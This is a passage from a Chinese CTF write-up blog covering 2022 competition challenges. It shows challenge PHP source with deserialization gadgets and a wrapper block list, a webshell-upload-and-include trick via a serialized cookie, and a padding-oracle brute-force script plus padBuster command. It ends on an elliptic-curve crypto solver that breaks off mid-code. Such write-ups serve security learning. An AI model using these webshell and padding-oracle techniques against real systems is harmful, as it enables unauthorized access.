invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;upload  &#x27;</span>.<span class="string">&quot;./&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">e</span>(<span class="variable">$filename</span>).<span class="string">&#x27; success!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">do_upload</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filesize-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;date;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Invalid file!&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuestShow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable language_">$this</span>-&gt;file-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contents = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">        <span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable language_">$this</span>-&gt;contents);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminShow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;schema = <span class="string">&#x27;file:///var/www/html/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="number">0</span>]-&gt;source;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="number">1</span>]-&gt;schema;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/usr|auto|log/i&#x27;</span> , <span class="variable language_">$this</span>-&gt;source))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable language_">$this</span>-&gt;schema . <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">        <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;schema !== <span class="string">&#x27;file:///var/www/html/&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;schema = <span class="string">&#x27;file:///var/www/html/&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;source !== <span class="string">&#x27;admin.png&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&#x27;admin.png&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// showfile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|bzip2|gopher|dict|zlib|data|input|%00/i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nop&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">        <span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">AdminShow</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/guest|demo/i&#x27;</span>,<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">GuestShow</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;p class=&#x27;tip&#x27;&gt;no permission, you can only see string &#x27;demo&#x27; and &#x27;guest&#x27;&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h2><h3 id="rcefile"><a href="#rcefile" class="headerlink" title="rcefile"></a>rcefile</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemh1eGlhbmZlaS5jb20vcGhwLzExOTczLmh0bWw=">文章链接</span></p>
<p>文章内提到，自动化加载机制会在实例化一个类时将对应类文件包含，自动加载的后缀是<code>.php</code>和<code>.inc</code></p>
<p>打开靶机，有文件上传，上传发现，需要<code>image/jpeg</code>，php，phtml都不行，文件被改了名字，所以配置文件也不行，<code>www.zip</code>，下载看，发现包含了一个<code>cinfig.inc.php</code>，而文件中有个函数：<code>spl_autoload_register()</code></p>
<p>然后又对<code>Cookie[&quot;userfile&quot;]</code>实施了反序列化，这就实现了一个类的实例化，因此，我们只要上传一个inc文件，文件中有马，将生成的文件名记录下来，例如：d829d02ffba31af930f908d4a09ad85e，然后写一个poc：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">d829d02ffba31af930f908d4a09ad85e</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> d829d02ffba31af930f908d4a09ad85e);</span><br><span class="line"><span class="comment">// O:32:&quot;d829d02ffba31af930f908d4a09ad85e&quot;:0:&#123;&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后将这个生成的序列化字符串作为cookie值的变量userfile值进行访问</p>
<p>就包含到马了</p>
<p>flag{29135aef-df99-4dba-9039-0fc7982450bd}</p>
<h1 id="巅峰极客"><a href="#巅峰极客" class="headerlink" title="巅峰极客"></a>巅峰极客</h1><h2 id="web-7"><a href="#web-7" class="headerlink" title="web"></a>web</h2><h3 id="babyweb-1"><a href="#babyweb-1" class="headerlink" title="babyweb"></a>babyweb</h3><p>试图弱密码登录，但没有成功，回显false，接着抓包看一眼，存在cookie：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_password=vJPV+K2/32O4fnGKBrP1xgEE3Ho7OpW687IOB/nfuUXADbwlkhqnvbbQWdl8GcJqPYrn4pZiST+FbVOktTa7ng==;session=eyJhZG1pbl9wYXNzd29yZCI6InZKUFYrSzIvMzJPNGZuR0tCclAxeGdFRTNIbzdPcFc2ODdJT0IvbmZ1VVhBRGJ3bGtocW52YmJRV2RsOEdjSnFQWXJuNHBaaVNUK0ZiVk9rdFRhN25nPT0iLCJpc2FkbWluIjpmYWxzZX0.Yvxnqg.W7Vlq3mz_SYFmsraNmUL1uHdC2U;</span><br></pre></td></tr></table></figure>
<p>flask_session解密：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c <span class="string">&quot;eyJhZG1pbl9wYXNzd29yZCI6InZKUFYrSzIvMzJPNGZuR0tCclAxeGdFRTNIbzdPcFc2ODdJT0IvbmZ1VVhBRGJ3bGtocW52YmJRV2RsOEdjSnFQWXJuNHBaaVNUK0ZiVk9rdFRhN25nPT0iLCJpc2FkbWluIjpmYWxzZX0.Yvxnqg.W7Vlq3mz_SYFmsraNmUL1uHdC2U&quot;</span></span><br><span class="line"><span class="comment"># b&#x27;&#123;&quot;admin_password&quot;:&quot;vJPV+K2/32O4fnGKBrP1xgEE3Ho7OpW687IOB/nfuUXADbwlkhqnvbbQWdl8GcJqPYrn4pZiST+FbVOktTa7ng==&quot;,&quot;isadmin&quot;:false&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>法一：<br>使用padbuster直接跑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./padBuster.pl url 71lYZdByH4QNKf+ZfBkGVIbXbejXLFE+ 8 --cookie auth=71lYZdByH4QNKf+ZfBkGVIbXbejXLFE+ -plaintext user=admin</span><br></pre></td></tr></table></figure>

<p>法二：<br>脚本爆破中间码：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">enc = base64.b64decode(<span class="string">&quot;KBLR73Xs+27+jqaDJxxn5m4dhT0JKrZO7ZrdTDKwY4MWT99pwDAr+Doinyc7Z7aQcWMIJXj1X26zfQIzsKJmpQ==&quot;</span>)</span><br><span class="line">iv = enc[:<span class="number">16</span>]</span><br><span class="line">a = enc[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">b = enc[<span class="number">32</span>:<span class="number">48</span>]</span><br><span class="line">c = enc[<span class="number">48</span>:<span class="number">64</span>]</span><br><span class="line">N = <span class="number">16</span></span><br><span class="line">middle = <span class="string">b&quot;&quot;</span></span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">jwt = <span class="string">&#x27;; session=eyJhZG1pbl9wYXNzd29yZCI6IktCTFI3M1hzKzI3K2pxYURKeHhuNW00ZGhUMEpLclpPN1pyZFRES3dZNE1XVDk5cHdEQXIrRG9pbnljN1o3YVFjV01JSlhqMVgyNnpmUUl6c0tKbXBRPT0iLCJpc2FkbWluIjpmYWxzZX0.Yvyqfg.rne4FOqd4fwNXCQxvbDkQq7iTCE&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze5c6hgy29ykascmvi4.cloudeci1.ichunqiu.com/login&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join([byte((a[i] ^ b[i])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">byte</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">return</span> key.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, N + <span class="number">1</span>):</span><br><span class="line">    padding = byte(step) * (step - <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;爆破的最后&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(step))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        new_iv = byte(<span class="number">0</span>) * (N - step) + byte(i) + xor(padding, middle)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;passxxxx&quot;</span>: <span class="string">&quot;xxmin&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        payload = new_iv + a</span><br><span class="line">        <span class="comment"># payload = a + new_iv + b</span></span><br><span class="line">        <span class="comment"># print(len(payload))</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;admin_password=&quot;</span> + base64.b64encode(payload).decode() + jwt</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(base64.b64encode(payload).decode())</span></span><br><span class="line">        r = requests.post(url=url, data=data, headers=headers)</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        <span class="comment"># print(i, r.text)</span></span><br><span class="line">        <span class="keyword">if</span> r.text == <span class="string">&quot;False&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, r.text)</span><br><span class="line">            middle = xor(byte(i), byte(step)) + middle</span><br><span class="line">            <span class="built_in">print</span>(middle)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(xor(middle,a))</span><br></pre></td></tr></table></figure>
<p>爆破出来后去掉填充部分，作为密码进行admin账号登录</p>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from secrets import flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">42</span></span><br><span class="line">p=getPrime(<span class="number">600</span>)</span><br><span class="line">a=bytes_to_long(flag)</span><br><span class="line">b=randrange(<span class="number">2</span>,p-<span class="number">1</span>)</span><br><span class="line">E=EllipticCurve(GF(p),[a,b])</span><br><span class="line">G=E.random_element()</span><br><span class="line"></span><br><span class="line">x1,y1,_=G</span><br><span class="line">G=<span class="number">2</span>*G</span><br><span class="line">x2,y2,_=G</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x1 = <span class="subst">&#123;x1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x2 = <span class="subst">&#123;x2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class="line"><span class="string">b = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class="line"><span class="string">x1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class="line"><span class="string">x2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>椭圆曲线方程</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">eulerCriterion</span>(<span class="params">a, p</span>):</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span> <span class="keyword">if</span> <span class="built_in">pow</span>(a, <span class="built_in">int</span>((p-<span class="number">1</span>)/<span class="number">2</span>), p) == p-<span class="number">1</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cipollaMult</span>(<span class="params">x1, y1, x2, y2, u, p</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x1*x2 + y1*y2*u) % p), ((x1*y2 + x2*y1) % p)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cipollaAlgorithm</span>(<span class="params">n, p</span>):</span><br><span class="line">    a = Mod(n, p)</span><br><span class="line">    out = []</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(p, <span class="number">1</span>, <span class="number">4</span>) == <span class="number">3</span>:</span><br><span class="line">        temp = <span class="built_in">pow</span>(a, <span class="built_in">int</span>((p+<span class="number">1</span>)/<span class="number">4</span>), p)</span><br><span class="line">        <span class="keyword">return</span> [temp, p - temp]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    t = randrange(<span class="number">2</span>, p)</span><br><span class="line">    u = <span class="built_in">pow</span>(t**<span class="number">2</span> - a, <span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">while</span> (eulerCriterion(u, p) == <span class="number">1</span>):</span><br><span class="line">        t = randrange(<span class="number">2</span>, p)</span><br><span class="line">        u = <span class="built_in">pow</span>(t**<span class="number">2</span> - a, <span class="number">1</span>, p)</span><br><span class="line"> </span><br><span class="line">    x0, y0 = t, <span class="number">1</span></span><br><span class="line">    x, y = t, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>((p + <span class="number">1</span>) / <span class="number">2</span>) - <span class="number">1</span>):</span><br><span class="line">        x, y = cipollaMult(x, y, x0, y0, u, p)</span><br><span class="line"> </span><br><span class="line">    out.extend([x, p - x])</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(out)</span><br><span class="line"></span><br><span class="line">p = <span class="number">3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class="line">b = <span class="number">1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class="line">x1 = <span class="number">2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class="line">x2 = <span class="number">1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lamSqr = (x2 + <span class="number">2</span> * x1) % p</span><br><span class="line">lam = cipollaAlgorithm(lamSqr, p)</span><br><span 